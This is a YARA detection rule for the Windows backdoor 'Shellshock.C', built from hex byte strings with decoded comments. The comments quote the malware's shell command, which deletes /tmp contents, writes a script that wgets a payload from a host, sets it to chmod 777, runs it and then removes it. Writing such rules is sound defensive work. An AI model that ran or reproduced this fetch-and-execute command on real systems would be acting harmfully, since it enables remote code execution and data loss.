
rule Backdoor_Win32_Shellshock_C_CZ{
	meta:
		description = "Backdoor:Win32/Shellshock.C!CZ,SIGNATURE_TYPE_PEHSTR,04 00 02 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {2f 62 69 6e 2f 62 61 73 68 20 2d 63 20 22 72 6d 20 2d 72 66 20 2f 74 6d 70 2f 2a 3b 65 63 68 6f 20 77 67 65 74 20 25 73 20 2d 4f 20 2f 74 6d 70 2f 43 68 69 6e 61 2e 5a 2d 25 73 20 3e 3e 20 2f 74 6d 70 2f 52 75 6e 2e 73 68 3b 65 63 68 6f 20 65 63 68 6f 20 42 79 20 43 68 69 6e 61 2e 5a 20 3e 3e 20 2f 74 6d 70 2f 52 75 6e 2e 73 68 3b 65 63 68 6f 20 63 68 6d 6f 64 20 37 37 37 20 2f 74 6d 70 2f 43 68 69 6e 61 2e 5a 2d 25 73 20 3e 3e } //01 00  /bin/bash -c "rm -rf /tmp/*;echo wget %s -O /tmp/China.Z-%s >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-%s >>
		$a_01_1 = {20 2f 74 6d 70 2f 52 75 6e 2e 73 68 3b 65 63 68 6f 20 2f 74 6d 70 2f 43 68 69 6e 61 2e 5a 2d 25 73 20 3e 3e 20 2f 74 6d 70 2f 52 75 6e 2e 73 68 3b 65 63 68 6f 20 72 6d 20 2d 72 66 20 2f 74 6d 70 2f 52 75 6e 2e 73 68 20 3e 3e 20 2f 74 6d 70 2f 52 75 6e 2e 73 68 3b 63 68 6d 6f 64 20 37 37 37 20 2f 74 6d 70 2f 52 75 6e 2e 73 68 3b 2f 74 6d 70 2f 52 75 6e 2e 73 68 } //02 00   /tmp/Run.sh;echo /tmp/China.Z-%s >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh
		$a_01_2 = {5c 50 72 6f 6a 65 63 74 73 5c 53 68 65 6c 6c 73 68 6f 63 6b 5c 52 65 6c 65 61 73 65 5c 53 68 65 6c 6c 73 68 6f 63 6b 2e 70 64 62 } //00 00  \Projects\Shellshock\Release\Shellshock.pdb
	condition:
		any of ($a_*)
 
}